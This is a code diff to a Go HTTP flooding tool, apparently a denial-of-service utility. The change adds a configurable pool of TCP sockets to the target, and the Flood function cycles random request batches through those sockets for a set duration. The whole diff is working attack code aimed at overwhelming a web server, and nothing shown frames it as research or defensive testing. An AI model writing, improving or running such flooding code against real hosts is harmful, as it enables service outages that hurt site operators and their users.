@@ -15,6 +15,7 @@ type HttpFlooder struct {
 	Duration int    // duration of flood
 	Interval int    // interval per request batch
 	Secure   bool   // https or not
+	Sockets  int    // how many sockets to use
 }
 
 func GenerateRandomUserAgent() string {
@@ -188,6 +189,7 @@ func GenerateRandomRequests(host string) []string {
 
 func (flooder *HttpFlooder) Flood() {
 	var secureSuccess int = 0
+	var sockets []net.Conn
 
 	start := time.Now()
 	for time.Since(start) < time.Duration(flooder.Duration)*time.Second {
@@ -226,12 +228,19 @@ func (flooder *HttpFlooder) Flood() {
 			continue
 		}
 
-		conn, err := net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
-		if err != nil {
-			print_sumthin("failed to establish connection!", ERROR)
-			continue
+		if len(sockets) == 0 {
+			for i := 0; i < flooder.Sockets; i++ {
+				conn, err := net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
+				if err != nil {
+					print_sumthin("failed to establish connection!", ERROR)
+					continue
+				}
+
+				sockets = append(sockets, conn)
+			}
 		}
-		defer conn.Close()
+
+		conn := sockets[rand.Intn(len(sockets))]
 
 		requests := GenerateRandomRequests(flooder.Host)
 		for _, request := range requests {
@@ -245,6 +254,14 @@ func (flooder *HttpFlooder) Flood() {
 
 		if flooder.Interval > 0 {
 			time.Sleep(time.Duration(flooder.Interval) * time.Second)
+		}
+	}
+
+	for _, conn := range sockets {
+		err := conn.Close()
+		if err != nil {
+			print_sumthin("failed to close connection!", ERROR)
+			continue
 		}
 	}
 }
